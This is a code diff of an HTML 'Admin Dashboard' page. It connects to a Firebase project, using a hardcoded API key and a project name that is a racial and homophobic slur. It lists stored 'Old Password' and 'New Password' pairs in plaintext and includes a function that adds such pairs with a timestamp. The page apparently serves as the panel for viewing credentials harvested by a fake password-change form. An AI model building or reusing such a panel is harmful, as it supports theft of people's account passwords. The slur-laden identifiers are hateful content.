@@ -5,105 +5,152 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Dashboard</title>
   <style>
-    /* Global styles */
     body {
-      font-family: 'Roboto', sans-serif;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
       margin: 0;
       padding: 0;
-      background-color: #f8f9fa;
     }
-
-    /* Header */
-    .header {
-      background-color: #343a40;
-      color: #ffffff;
-      padding: 15px;
-      text-align: center;
-    }
-
-    .header h1 {
-      margin: 0;
-      font-size: 24px;
-    }
-
-    /* Container */
     .container {
       max-width: 1200px;
       margin: 20px auto;
       padding: 20px;
-      background-color: #ffffff;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
     }
-
-    h2 {
-      margin-bottom: 20px;
-      font-size: 22px;
+    h1 {
       text-align: center;
+      color: #333;
+      margin-bottom: 20px;
     }
-
-    /* Actions */
-    .actions {
-      display: flex;
-      justify-content: flex-end;
-      margin-bottom: 10px;
-    }
-
-    .delete-btn {
-      background-color: #dc3545;
-      color: white;
-      border: none;
-      padding: 10px 15px;
-      font-size: 14px;
-      border-radius: 5px;
-      cursor: pointer;
-      display: none;
-      transition: background-color 0.3s;
-    }
-
-    .delete-btn:hover {
-      background-color: #c82333;
-    }
-
-    /* Table */
     table {
       width: 100%;
       border-collapse: collapse;
-      font-size: 16px;
-      overflow-x: auto;
+      margin: 20px 0;
     }
-
-    th, td {
-      padding: 12px 15px;
+    table th, table td {
       border: 1px solid #ddd;
-      text-align: left;
+      padding: 10px;
+      text-align: center;
     }
-
-    th {
-      background-color: #007bff;
-      color: #ffffff;
-      text-transform: uppercase;
+    table th {
+      background-color: #007BFF;
+      color: white;
     }
-
-    tr:nth-child(even) {
-      background-color: #f2f2f2;
+    table tbody tr:nth-child(even) {
+      background-color: #f9f9f9;
     }
-
-    tr:hover {
-      background-color: #e9ecef;
+    table tbody tr:hover {
+      background-color: #f1f1f1;
     }
-
-    /* Responsive Design */
     @media (max-width: 768px) {
-      th, td {
+      table th, table td {
         font-size: 14px;
-        padding: 10px;
+        padding: 8px;
       }
-      .delete-btn {
-        font-size: 12px;
-        padding: 8px 12px;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Admin Dashboard</h1>
+    <table>
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Old Password</th>
+          <th>New Password</th>
+        </tr>
+      </thead>
+      <tbody id="tableBody">
+        <!-- Data will be dynamically inserted here -->
+      </tbody>
+    </table>
+    <div class="footer">Powered by Firebase</div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
+    import { getFirestore, collection, addDoc, getDocs, query, orderBy } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
+      authDomain: "gay-ass-nigga.firebaseapp.com",
+      databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
+      projectId: "gay-ass-nigga",
+      storageBucket: "gay-ass-nigga.appspot.com",
+      messagingSenderId: "740449529935",
+      appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Reference to the table body
+    const tableBody = document.getElementById('tableBody');
+
+    // Fetch and display data
+    async function fetchPasswords() {
+      try {
+        // Query passwords collection ordered by timestamp
+        const passwordsRef = collection(db, 'passwords');
+        const orderedQuery = query(passwordsRef, orderBy('timestamp', 'asc'));
+        const querySnapshot = await getDocs(orderedQuery);
+
+        let index = 1; // Sequential ID counter
+        querySnapshot.forEach((doc) => {
+          const data = doc.data();
+
+          // Create table row
+          const row = document.createElement('tr');
+
+          // Sequential ID
+          const idCell = document.createElement('td');
+          idCell.textContent = index++;
+          row.appendChild(idCell);
+
+          // Old Password
+          const oldPasswordCell = document.createElement('td');
+          oldPasswordCell.textContent = data.oldPassword;
+          row.appendChild(oldPasswordCell);
+
+          // New Password
+          const newPasswordCell = document.createElement('td');
+          newPasswordCell.textContent = data.newPassword;
+          row.appendChild(newPasswordCell);
+
+          // Append row to table
+          tableBody.appendChild(row);
+        });
+      } catch (error) {
+        console.error("Error fetching passwords:", error);
       }
     }
 
-    @media (max-width: 480px) {
-      .
+    // Add password to Firestore (with timestamp)
+    async function addPassword(oldPassword, newPassword) {
+      try {
+        await addDoc(collection(db, 'passwords'), {
+          oldPassword,
+          newPassword,
+          timestamp: new Date()
+        });
+        console.log("Password added successfully!");
+      } catch (error) {
+        console.error("Error adding password:", error);
+      }
+    }
+
+    // Fetch passwords on page load
+    fetchPasswords();
+  </script>
+</body>
+</html>
